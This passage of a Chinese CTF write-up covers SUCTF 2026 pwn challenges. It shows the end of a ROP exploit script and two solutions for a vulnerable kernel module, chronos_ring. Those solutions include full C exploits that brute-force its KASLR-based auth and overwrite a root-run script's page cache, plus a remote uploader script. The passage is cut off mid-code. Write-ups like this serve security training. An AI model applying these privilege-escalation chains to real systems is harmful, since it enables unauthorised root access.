        pop_rsi,
        buf,
        pop_rax,
        0,
        syscall_ret,
        pop_rdx_leave_ret,
        FLAG_READ_SIZE,
        0,
        pop_rdi,
        1,
        pop_rsi,
        buf,
        pop_rax,
        1,
        syscall_ret,
    ]
    return pop_rdx_leave_ret, frame1, flat(chain), {0x120: path + b"\x00"}

def launch_rop(io, stack_target: int, blob: bytes, canary: int, libc_base: int, builder, *args):
    entry, frame1, rop, strings = builder(libc_base, stack_target, *args)
    payload = bytearray(blob)
    rop_off = 0x298
    if rop_off + len(rop) > len(payload):
        raise ValueError("ROP chain does not fit in the chosen stack window")
    payload[STACK_CANARY_OFF : STACK_CANARY_OFF + 8] = p64(canary)
    payload[STACK_SAVED_RBP_OFF : STACK_SAVED_RBP_OFF + 8] = p64(frame1)
    payload[STACK_SAVED_RIP_OFF : STACK_SAVED_RIP_OFF + 8] = p64(entry)
    payload[0x280:0x288] = p64(0)
    payload[rop_off : rop_off + len(rop)] = rop
    for off, s in strings.items():
        payload[off : off + len(s)] = s
    io.sendline(f"write {STACK_SLOT} {hex(len(payload))} {auth(STACK_SLOT)}".encode())
    io.recvuntil(b"> ")
    io.send(bytes(payload))
    return io.recvline()

def leak_flag_path() -> bytes:
    io = start()
    try:
        libc_base, stack_target, blob, canary = prepare_stack_slot(io)
        status = launch_rop(
            io, stack_target, blob, canary, libc_base, build_dirents_rop
        )
        log.debug(status.decode("latin-1", "ignore").rstrip())
        names = parse_dirents(io.recvn(GETDENTS_SIZE))
        log.info(
            "root entries = %s",
            ", ".join(name.decode("latin-1", "ignore") for name in names),
        )
        for name in names:
            if name.startswith(b"flag_"):
                return b"/" + name
        raise FileNotFoundError("no real flag_<hex> entry found in root directory")
    finally:
        io.close()

def read_flag_via_path(path: bytes) -> bytes:
    io = start()
    try:
        libc_base, stack_target, blob, canary = prepare_stack_slot(io)
        status = launch_rop(
            io, stack_target, blob, canary, libc_base, build_read_flag_rop, path
        )
        log.debug(status.decode("latin-1", "ignore").rstrip())
        return io.recvrepeat(2)
    finally:
        io.close()

def exploit():
    last_output = b""
    for attempt in range(1, MAX_ATTEMPTS + 1):
        path = leak_flag_path()
        log.info(
            "attempt %d/%d using %s",
            attempt,
            MAX_ATTEMPTS,
            path.decode("latin-1", "ignore"),
        )
        out = read_flag_via_path(path)
        last_output = out
        m = re.search(rb"flag\{[^}\n]+\}", out)
        if m and m.group(0) != b"flag{fake_flag}":
            return m.group(0).decode()
        log.warning("attempt %d did not yield the real flag, retrying", attempt)
    return last_output.decode("latin-1", "ignore")

def main():
    result = exploit()
    print(result)

if __name__ == "__main__":
    main()
flag{min1_vfs_5afe_b4ck3nd_chunk5_h1dd3n_s3cre7_SUCTF_2026}
```

## SU_Chronos_Ring

题目信息

- 附件：`bzImage`、`initramfs.cpio.gz`、`chronos_ring.ko`
- 设备节点：`/dev/chronos_ring`
- 运行环境：
  - `run.sh` 启动 QEMU
  - 内核参数默认开启 `kaslr`
  - init 脚本会周期性以 root 身份执行 `/tmp/job`

题目的核心是一个内核模块 `chronos_ring.ko`。模块本身同时存在多个可利用缺陷，但最稳定、最容易远程落地的利用链并不是竞态 UAF，而是：

1. 通过 `0x1002` 的弱鉴权进入已认证状态
2. 通过 `0x1004 + 0x1005 + 0x1008` 将攻击者数据写入 `/tmp/job` 的页缓存
3. 等待 root helper 执行 `/tmp/job`
4. 提权后读取 `/flag`

**一、环境与初始化逻辑**

解包 `initramfs` 后，`/init` 里有如下关键逻辑：

```HTTP
insmod /chronos_ring.ko
chmod 666 /dev/chronos_ring

echo "#!/bin/sh" > /tmp/job
echo "echo 'Root helper is running safely...'" >> /tmp/job
chmod 644 /tmp/job
(
    while true; do
        /bin/sh /tmp/job > /dev/null 2>&1
        sleep 3
    done
) &
```

也就是说：

- 普通用户 `ctf` 可以直接访问 `/dev/chronos_ring`
- `/tmp/job` 会每隔 3 秒被 root 执行一次

这已经给出了非常明显的利用目标：如果能改写 `/tmp/job` 的内容，就能稳定拿 root。

**二、驱动逆向与状态机**

核心函数有两个：

- `chronos_ioctl`
- `chronos_mmap`

全局只有一个上下文 `ctx`，所有进程共享，没有按 `file` 或进程隔离状态。

**1.** **`ctx`** **大致布局**

结合反编译和运行逻辑，可以恢复出一个近似结构：

```C++
struct chronos_ctx {
    spinlock_t lock;      // +0x0
    struct chronos_buf *buf; // +0x8
    uint32_t flags;       // +0x10
    uint32_t auth_key;    // +0x14
};
```

`flags` 至少有这些位：

- `bit0`：已通过 `0x1002` 认证
- `bit1`：已通过 `0x1003` pin 用户页
- `bit2`：已通过 `0x1004` 加载文件页
- `bit3`：执行过 `mmap`

**2.** **`chronos_buf`** **关键字段**

从 `chronos_ioctl` 和 `chronos_buf_gc_worker` 可以恢复出关键字段：

```C++
struct chronos_buf {
    uint32_t size;              // 0x00, 固定 0x1000
    void *data;                 // 0x08, get_free_pages 分配的 backing page
    struct page *data_page;     // 0x10
    uint32_t cache_loaded;      // 0x18, 0/1
    struct file *file;          // 0x20
    uint64_t page_idx;          // 0x28
    struct page *cache_page;    // 0x30
    uint8_t pinned;             // 0x38
    struct page *user_page;     // 0x40
    struct chronos_view *view;  // 0x48
    uint32_t view_kind;         // 0x50
    ...
    struct rcu_head rcu;        // 0x58
};
```

**3.** **`chronos_view`** **关键字段**

`0x1005` 创建 view，可能有两种类型：

- `kind=1`：匿名页
- `kind=2`：文件页缓存页

后续 `0x1008` 会把 `buf->data` 的内容 memcpy 到 `view->kaddr` 指向的位置。

**三、ioctl 功能梳理**

`chronos_ioctl` 支持这些命令：

`0x1001` - 创建 buffer

- 分配 `chronos_buf`
- 再分配一页作为 `buf->data`
- `size=0x1000`

注意：这页 **没有清零**

`0x1002` - 认证

用户传入两个 `uint64_t`，驱动验证：

((uint32_t)rhs ^ lhs ^ (((uint64_t)&kfree >> 4) & 0xFFFFFFFFFFFE0000ULL))

​    == 0xF372FE94F82B3C6EULL

认证成功后，`ctx->flags |= 1`

`0x1003` - pin 用户页

- 要求已认证
- `pin_user_pages_fast`
- 把用户页保存到 `buf->user_page`

`0x1004` - 加载文件页

- 要求已认证
- 参数是 `{fd, page_idx}`
- `fget(fd)` 后检查文件名哈希
- 只有文件名哈希等于 `0xDDD42FDC` 才允许继续
- 对应的字符串其实就是 `"job"`
- 随后 `read_cache_page()` 读取页缓存页到 `buf->cache_page`

也就是说，驱动只允许操作文件名为 `job` 的文件页缓存。

`0x1005` - 创建 view

前提：

- 已认证
- 已 `pin` 用户页

行为：

- 如果 `buf->cache_page` 存在，则创建 `kind=2` 的 view，直接引用该文件页缓存页
- 否则新分配匿名页，创建 `kind=1` 的 view

`0x1006` - 释放文件页

- 清空 `file`
- `put_page(cache_page)`
- 清掉 `bit2`

`0x1007` - 向 ring buffer 写数据

参数格式：

```HTTP
struct {
    uint64_t user_buf;
    uint32_t len;
    uint32_t off;
}
```

特点：

- 一次最多写 `1..64` 字节
- 目标是 `buf->data + off`
- 仅在 `cache_loaded == 0` 时允许写

**`0x1008`** **- 同步到当前 view**

参数格式：

```HTTP
struct {
    uint64_t reserved;
    uint32_t len;
    uint32_t off;
}
核心逻辑：
memcpy(view->kaddr + off, buf->data + off, len);
if (view->kind == 2)
    set_page_dirty(view->page);
```

这就是整个利用链的关键：只要让 `view->kaddr` 指向 `/tmp/job` 的页缓存，就可以把 `buf->data` 中的攻击者内容写回 `/tmp/job`。

`0x1009` - 读取状态

回传内部状态，辅助调试。

`0x100A` - 销毁 buffer

- 把 `ctx->buf` 置空
- `call_rcu()` 异步回收

**四、漏洞点分析**

这个模块并不是单漏洞，而是多漏洞组合。

**漏洞 1：backing page 未清零，存在信息泄露**

`0x1001` 中：

buf->data = get_free_pages(...);

分配后没有 `memset` 或 `__GFP_ZERO`。

随后 `chronos_mmap` 会把 `buf->data` 直接映射到用户态，因此可以直接读到旧内核数据。

这是一个标准的内核页信息泄露点。

**漏洞 2：****`mmap + free_pages`** **造成 stale PTE / 页级 UAF**

`chronos_mmap` 中：

- 把 `buf->data_page` 计算成 PFN
- `remap_pfn_range()` 给用户态

但 `0x100A` 和 `cleanup_module` 的异步回收里会：

free_pages(buf->data, ...);

并没有撤销已经建立的用户态映射。

于是用户仍持有一个指向已释放物理页的有效 PTE，可以继续读写后续被重新分配的页，这就是典型的 stale PTE / page UAF。

这条链理论上也能做，但本题更稳的路线不是它。

漏洞 3：`0x1008` 对 `buf` 的使用存在竞态 UAF

`0x1008` 的逻辑大致是：

1. 上锁拿到 `buf`
2. 检查边界
3. 解锁
4. 开 RCU read lock
5. 继续使用先前缓存的 `buf` 指针

问题在于：

- `view` 受 RCU 保护
- `buf` 不受 RCU 保护
- `0x100A`/`cleanup_module` 可并发把 `buf` 释放

于是存在经典的 unlock 后使用悬空 `buf` 指针的竞态 UAF。

**漏洞 4：鉴权依赖内核地址，但熵极低**

`0x1002` 认证依赖 `&kfree` 的高位地址，看起来像是要先拿 KASLR 泄露。

但实际上：

masked = (kfree_addr >> 4) & 0xFFFFFFFFFFFE0000ULL

对 x86_64 Linux 而言：

- KASLR 通常是 `0x200000` 对齐
- 常见范围大约 1GB
- 也就是最多只有 `512` 种可能

而驱动对认证失败：

- 没有延迟
- 没有次数限制
- 没有惩罚

所以远程场景根本没必要先泄露地址，直接爆破这 512 种 KASLR 偏移即可。

**五、为什么选择页缓存投毒，而不是页级 UAF**

远程利用最重要的是稳定性。

页级 UAF 路线的问题

- 需要做页风水
- 要控制被释放页的后续复用
- 容易受 SMP、调度和 slab/buddy 状态影响
- 远程成功率往往不稳定

页缓存投毒路线的优势

- 利用链几乎全是功能性接口
- 不依赖竞态
- 不依赖复杂堆风水
- root helper 明确执行 `/tmp/job`
- 只需通过一次弱认证即可

这条链更像“逻辑漏洞 + 环境后门”的组合，远程稳定性显著更高。

**六、最终利用链**

**本地无** **`kptr_restrict`** **场景**

直接从 `/proc/kallsyms` 取 `kfree`，然后：

1. `CHRONOS_ALLOC`
2. `CHRONOS_AUTH`
3. `CHRONOS_PIN_USER`
4. `CHRONOS_WRITE_BUF`
5. `CHRONOS_LOAD_FILE("/tmp/job")`
6. `CHRONOS_CREATE_VIEW`
7. `CHRONOS_SYNC_VIEW`
8. 等 root helper 执行
9. 读取 `/flag`

**远程有** **`kptr_restrict`** **场景**

不能直接读 `/proc/kallsyms`，但可爆破：

```HTTP
base_kfree = 0xffffffff813762b0ULL;   // 本地相同 bzImage 的 nokaslr 地址
for (i = 0; i < 512; i++) {
    guess_kfree = base_kfree + i * 0x200000;
    masked = (guess_kfree >> 4) & AUTH_MASK;
    auth.lhs = AUTH_MAGIC ^ masked;
    auth.rhs = 0;
    if (ioctl(fd, CHRONOS_AUTH, &auth) == 0)
        break;
}
```

一旦猜中：

- 认证成功
- 后续利用链与本地完全相同

**七、利用代码说明**

题目目录下已有可用利用程序：

- `exp.c`
- `exp`
- `remote.py`

```
exp.c
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define DEV_PATH "/dev/chronos_ring"

#define CHRONOS_ALLOC       0x1001
#define CHRONOS_AUTH        0x1002
#define CHRONOS_PIN_USER    0x1003
#define CHRONOS_LOAD_FILE   0x1004
#define CHRONOS_CREATE_VIEW 0x1005
#define CHRONOS_DROP_FILE   0x1006
#define CHRONOS_WRITE_BUF   0x1007
#define CHRONOS_SYNC_VIEW   0x1008
#define CHRONOS_STATUS      0x1009
#define CHRONOS_FREE        0x100A

#define AUTH_MAGIC 0xF372FE94F82B3C6EULL
#define AUTH_MASK  0xFFFFFFFFFFFE0000ULL

struct auth_req {
    uint64_t lhs;
    uint64_t rhs;
};

struct file_req {
    uint32_t fd;
    uint32_t page_idx;
} __attribute__((packed));

struct write_req {
    uint64_t user_buf;
    uint32_t len;
    uint32_t off;
} __attribute__((packed));

struct sync_req {
    uint64_t reserved;
    uint32_t len;
    uint32_t off;
} __attribute__((packed));

static void die(const char *msg)
{
    perror(msg);
    exit(1);
}

static void xioctl(int fd, unsigned long cmd, void *arg, const char *name)
{
    if (ioctl(fd, cmd, arg) == -1) {
        fprintf(stderr, "[!] %s failed: %s\n", name, strerror(errno));
        exit(1);
    }
}

static void write_ring(int fd, uint32_t off, const void *buf, uint32_t len)
{
    struct write_req req;

    if (len == 0 || len > 64) {
        fprintf(stderr, "[!] invalid CHRONOS_WRITE_BUF length: %u\n", len);
        exit(1);
    }

    req.user_buf = (uint64_t)(uintptr_t)buf;
    req.len = len;
    req.off = off;
    xioctl(fd, CHRONOS_WRITE_BUF, &req, "CHRONOS_WRITE_BUF");
}

static void sync_view(int fd, uint32_t off, uint32_t len)
{
    struct sync_req req;

    req.reserved = 0;
    req.len = len;
    req.off = off;
    xioctl(fd, CHRONOS_SYNC_VIEW, &req, "CHRONOS_SYNC_VIEW");
}

static void dump_flag(void)
{
    int fd;
    ssize_t n;
    char buf[256];

    fd = open("/flag", O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "[!] open /flag failed: %s\n", strerror(errno));
        return;
    }

    n = read(fd, buf, sizeof(buf) - 1);
    if (n < 0) {
        fprintf(stderr, "[!] read /flag failed: %s\n", strerror(errno));
        close(fd);
        return;
    }

    buf[n] = '\0';
    printf("[+] /flag = %s\n", buf);
    close(fd);
}

int main(void)
{
    static const char payload[] = "#!/bin/sh\nchmod 644 /flag\n";
    uint64_t pin_addr;
    void *scratch;
    struct auth_req auth;
    struct file_req file_page;
    int devfd;
    int jobfd;

    printf("[*] opening %s\n", DEV_PATH);
    devfd = open(DEV_PATH, O_RDWR);
    if (devfd == -1) {
        die("open device");
    }

    printf("[*] ioctl CHRONOS_ALLOC\n");
    xioctl(devfd, CHRONOS_ALLOC, NULL, "CHRONOS_ALLOC");

    // ================== KASLR Brute-Force ==================
    printf("[*] Brute-forcing CHRONOS_AUTH (max 512 attempts)...\n");
    
    // 你本地分析出的无偏移 (nokaslr) kfree 地址
    uint64_t base_kfree = 0xffffffff813762b0ULL; 
    int auth_success = 0;

    for (int i = 0; i < 512; i++) {
        // KASLR 步长固定为 2MB (0x200000)
        uint64_t guess_kfree = base_kfree + (i * 0x200000ULL);
        uint64_t masked = (guess_kfree >> 4) & AUTH_MASK;
        
        auth.rhs = 0;
        auth.lhs = AUTH_MAGIC ^ masked ^ (uint32_t)auth.rhs;
        
        // ioctl 返回 0 说明 KASLR 猜对了！
        if (ioctl(devfd, CHRONOS_AUTH, &auth) == 0) {
            printf("[+] CHRONOS_AUTH success!\n");
            printf("[+] Found KASLR offset = 0x%llx\n", (unsigned long long)(i * 0x200000ULL));
            printf("[+] Real kfree = 0x%llx, Masked = 0x%llx\n", 
                   (unsigned long long)guess_kfree, 
                   (unsigned long long)masked);
            auth_success = 1;
            break;
        }
    }

    if (!auth_success) {
        die("[-] CHRONOS_AUTH brute-force failed. The remote server might be using a slightly different kernel build.");
    }
    // ========================================================

    scratch = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (scratch == MAP_FAILED) {
        die("mmap scratch");
    }
    memset(scratch, 0x41, 0x1000);
    pin_addr = (uint64_t)(uintptr_t)scratch;

    printf("[*] ioctl CHRONOS_PIN_USER\n");
    xioctl(devfd, CHRONOS_PIN_USER, &pin_addr, "CHRONOS_PIN_USER");

    jobfd = open("/tmp/job", O_RDONLY);
    if (jobfd == -1) {
        die("open /tmp/job");
    }
    file_page.fd = (uint32_t)jobfd;
    file_page.page_idx = 0;

    printf("[*] writing payload into ring buffer\n");
    write_ring(devfd, 0, payload, (uint32_t)(sizeof(payload) - 1));

    printf("[*] ioctl CHRONOS_LOAD_FILE for /tmp/job page 0\n");
    xioctl(devfd, CHRONOS_LOAD_FILE, &file_page, "CHRONOS_LOAD_FILE");

    printf("[*] ioctl CHRONOS_CREATE_VIEW\n");
    xioctl(devfd, CHRONOS_CREATE_VIEW, NULL, "CHRONOS_CREATE_VIEW");

    printf("[*] syncing payload into /tmp/job page cache\n");
    sync_view(devfd, 0, (uint32_t)(sizeof(payload) - 1));

    printf("[*] cleanup\n");
    ioctl(devfd, CHRONOS_DROP_FILE, NULL);
    ioctl(devfd, CHRONOS_FREE, NULL);
    close(jobfd);
    close(devfd);

    printf("[*] waiting for root helper to execute /tmp/job\n");
    sleep(5);

    dump_flag();
    return 0;
}
```

核心逻辑：

1. 打开 `/dev/chronos_ring`
2. `0x1001` 分配 buffer
3. 若能读 `kallsyms` 就直接解析 `kfree`
4. 若不能读，则爆破 512 个 KASLR 偏移
5. 成功后绑定 `/tmp/job` 页缓存
6. 把 payload：

\#!/bin/sh

chmod 644 /flag

写入 `/tmp/job`

1. 等 root helper 执行
2. 读取 `/flag`

```
remote.py
from pwn import *
import base64

context.log_level = "debug"
```

读取并编码你的 exp

```HTTP
with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("101.245.64.169", 10000)
```

正确的提示符 (截取末尾特征最明显的部分)

```HTTP
PROMPT = b"$ "
```

**1. 等待机器启动并出现初始提示符**

```HTTP
p.recvuntil(PROMPT)
log.success("Boot finished, caught shell prompt!")
```

**2. 分块上传**

```Python
chunk_size = 0x200
for i in range(0, len(exp), chunk_size):
    chunk = exp[i:i + chunk_size].decode()

    # 构造命令并转为 bytes 发送
    cmd = f'echo -n "{chunk}" >> /tmp/b64_exp'
    p.sendline(cmd.encode())

    # [关键] 发完一条必须等提示符回来，确保 QEMU 串口消化完毕
    p.recvuntil(PROMPT)

    log.info(f"Uploaded {min(i + chunk_size, len(exp))} / {len(exp)} bytes")

log.success("Upload complete! Decoding and executing...")
```

**3. 解码、赋权并执行**

```HTTP
p.sendline(b"base64 -d /tmp/b64_exp > /tmp/exploit")
p.recvuntil(PROMPT)

p.sendline(b"chmod +x /tmp/exploit")
p.recvuntil(PROMPT)
```

**开始执行！**

```HTTP
p.sendline(b"/tmp/exploit")
```

**交还控制权**

```HTTP
p.interactive()
```

远程脚本负责：

1. 连接远程服务
2. 用 base64 分块上传 `exp`
3. 解码得到 `/tmp/exploit`
4. 执行 `/tmp/exploit`
5. 拿到 flag

**调试要点**

这题调试时有几个坑：

1. 模块不是普通单 `.text`

`chronos_ring.ko` 的代码被拆分到多个 section：

- `.text.chronos_mmap`
- `.text.chronos_ioctl`
- `.text.put_page`
- `.text.chronos_view_rcu_cb`
- `.text.chronos_buf_rcu_cb`
- `.text.chronos_buf_gc_worker`
- `.text.chronos_view_gc_worker`
- `.exit.text`

因此不能直接：

```HTTP
add-symbol-file chronos_ring.ko <text_base>
```

而需要分别指定 section 地址。

1. 普通用户看不到内核地址

远程默认是 `ctf` 用户，`/proc/kallsyms` 中模块和内核地址都会显示为 `0`。

本地调试时可以：

- 修改 `initramfs` 直接进 root shell
- `echo 0 > /proc/sys/kernel/kptr_restrict`

1. `0x1007` 和 `0x1004` 的调用顺序不能错

驱动要求：

- `CHRONOS_WRITE_BUF` 只能在 `cache_loaded == 0` 时使用

因此必须：

1. 先 `WRITE_BUF`
2. 再 `LOAD_FILE`
3. 再 `CREATE_VIEW`
4. 再 `SYNC_VIEW`

否则 `0x1007` 会直接返回 `-EPERM`

## SU_Chronos_Ring1

这题的关键不在于传统内核提权，而在于识别题目主动给出的 root sink：

1. 普通用户可直接操作 `/dev/chronos_ring`
2. root 会周期性执行 `/tmp/job`
3. 模块允许把目标文件页载入、修改并刷回页缓存

因此最短利用链不是 `commit_creds(prepare_kernel_cred(0))`，而是直接篡改 `/tmp/job`，等 root helper 帮我们读出 `/flag`。

**环境信息**

核心启动参数如下：

```Bash
qemu-system-x86_64 \
    -m 96M \
    -nographic \
    -smp 2 \
    -cpu max \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -append "console=ttyS0 kaslr no5lvl pti=on oops=panic panic=1 quiet"
```

可以直接得到几个事实：

- 开启了 `kaslr`
- 通过串口交互
- 远端 `nc` 本质上是包了一层 qemu

按现有逆向记录，`init` 里最重要的逻辑是：

```Bash
insmod /chronos_ring.ko
chmod 666 /dev/chronos_ring

echo "#!/bin/sh" > /tmp/job
echo "echo 'Root helper is running safely...'" >> /tmp/job
chmod 644 /tmp/job
(
    while true; do
        /bin/sh /tmp/job > /dev/null 2>&1
        sleep 3
    done
) &
```

这就是整题的利用入口。

**模块接口**

逆向 `chronos_ring.ko` 后，可以恢复出如下 ioctl：

```C
#define CHRONOS_CREATE     0x1001
#define CHRONOS_AUTH       0x1002
#define CHRONOS_PIN_USER   0x1003
#define CHRONOS_LOAD_FILE  0x1004
#define CHRONOS_SNAPSHOT   0x1005
#define CHRONOS_RESET_FILE 0x1006
#define CHRONOS_WRITE_BUF  0x1007
#define CHRONOS_FLUSH_VIEW 0x1008
#define CHRONOS_INFO       0x1009
#define CHRONOS_DESTROY    0x100a
```

关键接口只有 5 个：

**CHRONOS_AUTH**

参数结构：

```C
struct auth_req {
    uint64_t x;
    uint32_t y;
    uint32_t pad;
};
```

校验公式：

```C
((kfree >> 4) & 0xfffffffffffe0000ULL) ^ x ^ y == 0xf372fe94f82b3c6eULL
```

它本质上只是用 `kfree` 做一次 KASLR 相关校验，通过后才允许后续敏感操作。

**CHRONOS_LOAD_FILE**

参数结构：

```C
struct file_req {
    uint32_t fd;
    uint32_t pgoff;
};
```

逻辑要点：

- `fget(fd)`
- 取文件名 `dentry->d_name.name`
- 做 FNV-1a 32 位哈希
- 只有哈希等于 `0xddd42fdc` 才允许继续
- `read_cache_page()` 取对应页

这个哈希可以直接反推出目标文件名是 `job`：

```Python
def fnv1a32(s: bytes):
    h = 0x811c9dc5
    for b in s:
        h ^= b
        h = (h * 0x1000193) & 0xffffffff
    return h

print(hex(fnv1a32(b"job")))  # 0xddd42fdc
```

所以目标文件就是 `/tmp/job`。

**CHRONOS_SNAPSHOT**

把当前 view 对应页复制成 ring buffer 的 backing page。  

如果当前 view 指向的是文件页，那么 snapshot 之后 ring buffer 里就是该文件页的内容。

**CHRONOS_WRITE_BUF**

往 ring buffer 写入用户数据：

```C
memcpy(buf->data + off, user_buf, len);
```

**CHRONOS_FLUSH_VIEW**

把 ring buffer 内容刷回 view 对应页：

```C
memcpy(view_page + off, buf->data + off, len);
if (file_backed)
    set_page_dirty(view_page);
```

这一步是最终改写 `/tmp/job` 页缓存的关键。

**利用思路**

很多人会下意识把它当成常规 kernel pwn，去找：

- UAF
- 任意地址读写
- dirty pagetable
- cred 劫持
- ROP 到 `commit_creds(prepare_kernel_cred(0))`

这题没必要走那么远。题目已经把 root sink 明着放在 `/tmp/job` 上了，所以最短利用链是：

1. `CHRONOS_CREATE` 创建 ring buffer
2. 爆破 `CHRONOS_AUTH`
3. `CHRONOS_PIN_USER` 让模块内部 view 进入预期状态
4. 打开 `/tmp/job` 并用 `CHRONOS_LOAD_FILE` 载入目标文件页
5. `CHRONOS_SNAPSHOT` 把文件页内容放进 ring buffer
6. `CHRONOS_RESET_FILE` 调整模块状态
7. `CHRONOS_WRITE_BUF` 把恶意脚本写入 ring buffer
8. `CHRONOS_FLUSH_VIEW` 刷回 `/tmp/job` 的页缓存
9. 等待 root helper 执行 `/tmp/job`

最终写入的 payload 很简单：

```Bash
cat /flag>/home/ctf/flag;chmod 644 /home/ctf/flag
```

这样 root 每次执行 `/tmp/job` 时，都会把 flag 复制到普通用户可读的位置。

**AUTH 绕过**

从逆向得到的静态符号：

```Plain
kfree = 0xffffffff813762b0
```

题目环境下，x86_64 内核 KASLR 以 `0x200000` 为粒度滑动，因此可以直接枚举：

```C
STATIC_KFREE + i * 0x200000
```

并构造：

```C
masked = ((candidate_kfree >> 4) & 0xfffffffffffe0000ULL);
x = 0xf372fe94f82b3c6eULL ^ masked ^ y;
```

令 `y = 0` 即可。

这一步本质上就是纯 KASLR 爆破，没有额外技巧。

**利用代码**

思路是：

- 内嵌 guest 侧 C exp
- 本地编译出 Linux ELF
- `base64 + gzip` 上传到目标环境
- 执行后等待 `/home/ctf/flag`

```Python
#!/usr/bin/env python3
import argparse
import base64
import gzip
import os
import re
import shlex
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

PROMPT = b"[ctf@SUCTF2026 ~]$"
DEFAULT_HOST = "101.245.64.169"
DEFAULT_PORT = 10000
ANSI_RE = re.compile(rb"\x1b\[[0-9;?]*[ -/]*[@-~]")
ELF_MAGIC = b"\x7fELF"

GUEST_EXP_C = r"""
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define DEV_PATH "/dev/chronos_ring"

#define CHRONOS_CREATE 0x1001
#define CHRONOS_AUTH 0x1002
#define CHRONOS_PIN_USER 0x1003
#define CHRONOS_LOAD_FILE 0x1004
#define CHRONOS_SNAPSHOT 0x1005
#define CHRONOS_RESET_FILE 0x1006
#define CHRONOS_WRITE_BUF 0x1007
#define CHRONOS_FLUSH_VIEW 0x1008

#define TARGET_CONST 0xf372fe94f82b3c6eULL
#define STATIC_KFREE 0xffffffff813762b0ULL
#define KASLR_STEP 0x200000ULL
#define KASLR_SLOTS 512

struct auth_req {
    uint64_t x;
    uint32_t y;
    uint32_t pad;
};

struct file_req {
    uint32_t fd;
    uint32_t pgoff;
};

struct write_req {
    uint64_t src;
    uint32_t len;
    uint32_t off;
};

static void die(const char *msg) {
    perror(msg);
    exit(1);
}

static int auth_device(int fd) {
    struct auth_req req;
    uint64_t masked;
    unsigned i;

    memset(&req, 0, sizeof(req));
    for (i = 0; i < KASLR_SLOTS; i++) {
        masked = ((STATIC_KFREE + (i * KASLR_STEP)) >> 4) & 0xfffffffffffe0000ULL;
        req.y = 0;
        req.x = TARGET_CONST ^ masked ^ req.y;
        if (ioctl(fd, CHRONOS_AUTH, &req) == 0) {
            fprintf(stderr, "[*] auth slide slot=%u\n", i);
            return 0;
        }
    }
    return -1;
}

static void write_all(int fd, const char *buf, size_t len) {
    size_t off = 0;

    while (off < len) {
        struct write_req req;
        size_t chunk = len - off;

        if (chunk > 64) {
            chunk = 64;
        }
        req.src = (uintptr_t)(buf + off);
        req.len = (uint32_t)chunk;
        req.off = (uint32_t)off;
        if (ioctl(fd, CHRONOS_WRITE_BUF, &req) != 0) {
            die("ioctl(CHRONOS_WRITE_BUF)");
        }
        off += chunk;
    }
}

static int wait_for_flag(const char *path, unsigned tries) {
    FILE *fp;
    char line[256];
    unsigned i;

    for (i = 0; i < tries; i++) {
        fp = fopen(path, "r");
        if (fp != NULL) {
            if (fgets(line, sizeof(line), fp) != NULL) {
                printf("%s", line);
                fclose(fp);
                return 0;
            }
            fclose(fp);
        }
        sleep(1);
    }
    return -1;
}

int main(void) {
    static const char payload[] = "cat /flag>/home/ctf/flag;chmod 644 /home/ctf/flag\n";
    struct file_req f_req;
    struct write_req flush_req;
    char *anchor;
    int devfd;
    int jobfd;

    fprintf(stderr, "[*] guest_exp start\n");

    devfd = open(DEV_PATH, O_RDWR);
    if (devfd < 0) {
        die("open(/dev/chronos_ring)");
    }
    if (ioctl(devfd, CHRONOS_CREATE, 0) != 0) {
        die("ioctl(CHRONOS_CREATE)");
    }
    if (auth_device(devfd) != 0) {
        fprintf(stderr, "[-] auth brute force failed\n");
        return 1;
    }

    anchor = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (anchor == MAP_FAILED) {
        die("mmap(anchor)");
    }
    anchor[0] = 'A';
    if (ioctl(devfd, CHRONOS_PIN_USER, &anchor) != 0) {
        die("ioctl(CHRONOS_PIN_USER)");
    }

    jobfd = open("/tmp/job", O_RDONLY);
    if (jobfd < 0) {
        die("open(/tmp/job)");
    }
    f_req.fd = (uint32_t)jobfd;
    f_req.pgoff = 0;
    if (ioctl(devfd, CHRONOS_LOAD_FILE, &f_req) != 0) {
        die("ioctl(CHRONOS_LOAD_FILE)");
    }
    if (ioctl(devfd, CHRONOS_SNAPSHOT, 0) != 0) {
        die("ioctl(CHRONOS_SNAPSHOT)");
    }
    if (ioctl(devfd, CHRONOS_RESET_FILE, 0) != 0) {
        die("ioctl(CHRONOS_RESET_FILE)");
    }

    write_all(devfd, payload, sizeof(payload) - 1);
    memset(&flush_req, 0, sizeof(flush_req));
    flush_req.len = (uint32_t)(sizeof(payload) - 1);
    flush_req.off = 0;
    if (ioctl(devfd, CHRONOS_FLUSH_VIEW, &flush_req) != 0) {
        die("ioctl(CHRONOS_FLUSH_VIEW)");
    }

    fprintf(stderr, "[*] job page overwritten, waiting for root helper\n");
    if (wait_for_flag("/home/ctf/flag", 8) != 0) {
        fprintf(stderr, "[-] timed out waiting for /home/ctf/flag\n");
        return 1;
    }
    return 0;
}
"""

def strip_ansi(data: bytes) -> bytes:
    return ANSI_RE.sub(b"", data)

def qemu_cmd() -> list[str]:
    monitor_sink = "NUL" if os.name == "nt" else "/dev/null"
    return [
        "qemu-system-x86_64",
        "-m",
        "96M",
        "-nographic",
        "-smp",
        "2",
        "-cpu",
        "max",
        "-kernel",
        "./bzImage",
        "-initrd",
        "./initramfs.cpio.gz",
        "-monitor",
        monitor_sink,
        "-append",
        "console=ttyS0 kaslr no5lvl pti=on oops=panic panic=1 quiet",
        "-no-reboot",
    ]

def to_wsl_path(path: Path) -> str:
    drive = path.drive.rstrip(":").lower()
    tail = path.as_posix().split(":", 1)[1]
    return f"/mnt/{drive}{tail}"

def is_linux_elf(path: Path) -> bool:
    try:
